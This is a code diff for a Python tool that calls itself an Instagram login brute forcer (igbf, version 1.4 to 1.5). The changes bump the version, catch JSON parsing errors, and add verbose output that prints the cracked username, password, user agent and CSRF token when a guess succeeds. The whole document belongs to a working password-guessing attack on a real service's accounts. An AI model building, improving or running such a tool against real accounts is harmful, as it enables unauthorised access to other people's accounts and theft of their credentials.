@@ -4,7 +4,7 @@
 #                                                                     #
 #  [igbf]    : Instagram Brute Forcer                                 #
 #  [desc]    : python3 script to perform instagram login brute force  #
-#  [version] : 1.4                                                    #
+#  [version] : 1.5                                                    #
 #  [dev]     : @s41r4j                                                #
 #  [github]  : https://github.com/s41r4j/igbf                         #
 #                                                                     #
@@ -329,7 +329,7 @@ def main():
     printit("▒ ░░ ░   ░  ░    ░  ░ ░   ░▒ ", center=' ', coledt=[1, 49, 91])
     printit("░        ░  ░                 ", center=' ', coledt=[1, 49, 91])
     printit("                  ░          ░ ", center=' ', coledt=[1, 49, 91])
-    printit('[ Instagram Brute Forcer (igbf:v1.4) ]', center=' ', coledt=[7, 49, 97], line_down=True)
+    printit('[ Instagram Brute Forcer (igbf) ]', center=' ', coledt=[7, 49, 97], line_down=True)
 
     # Checking if the arguments have been passed
     if username is None or wordlist is None:
@@ -459,13 +459,23 @@ def main():
             sys.exit()
 
         # login_response -> json format
-        json_data = json.loads(login_response.text)
+        try:
+            json_data = json.loads(login_response.text)
+        except json.decoder.JSONDecodeError:
+            pass
         
         # Checking if the username is exists
         try:
             if json_data["user"] == False:
-                printit(password, coledt=[7, 49, 97], normaltxt_start="\n[#] Login successful (pwd)> ")
-                sys.exit()
+                if verbose: 
+                    printit("\n[#] Login successful: ", coledt=[7, 49, 92])
+                    printit(username, coledt=[7, 49, 97], normaltxt_start="[+] Username: ")
+                    printit(password, coledt=[7, 49, 97], normaltxt_start="[+] Password: ")
+                    printit2(str(user_agent), coledt=[1, 49, 96], normaltxt_start="\n[+] User-agent: ")
+                    printit2(str(csrf_token), coledt=[1, 49, 96], normaltxt_start="\n[+] CSRF token: ")
+                else: 
+                    printit(password, coledt=[7, 49, 97], normaltxt_start="\n[#] Login successful (pwd)> ", line_down=True)
+                break
         except SystemExit:
             sys.exit()
         except:
@@ -482,13 +492,20 @@ def main():
                     printit2(str(csrf_token), coledt=[1, 49, 96], normaltxt_start="\n[+] CSRF token: ")
                     printit2(str("https://www.instagram.com"+json_data["checkpoint_url"]), coledt=[1, 49, 96], normaltxt_start="\n[+] Checkpoint (*req) URL: ")
                 else: 
-                    printit(password, coledt=[7, 49, 97], normaltxt_start="\n[#] Login successful (pwd)> ")
+                    printit(password, coledt=[7, 49, 97], normaltxt_start="\n[#] Login successful (pwd)> ", line_down=True)
                 break            
         except KeyError:
             try:
                 if json_data["authenticated"] == True:
-                    printit(password, coledt=[7, 49, 97], normaltxt_start="\n[#] Login successful (pwd)> ")
-                    sys.exit()
+                    if verbose: 
+                        printit("\n[#] Login successful: ", coledt=[7, 49, 92])
+                        printit(username, coledt=[7, 49, 97], normaltxt_start="[+] Username: ")
+                        printit(password, coledt=[7, 49, 97], normaltxt_start="[+] Password: ")
+                        printit2(str(user_agent), coledt=[1, 49, 96], normaltxt_start="\n[+] User-agent: ")
+                        printit2(str(csrf_token), coledt=[1, 49, 96], normaltxt_start="\n[+] CSRF token: ")
+                    else: 
+                        printit(password, coledt=[7, 49, 97], normaltxt_start="\n[#] Login successful (pwd)> ", line_down=True)
+                    break
                 else:
                     print_login_failed(password, verbose, proxy, single_proxy, login_response.status_code)
             except SystemExit:
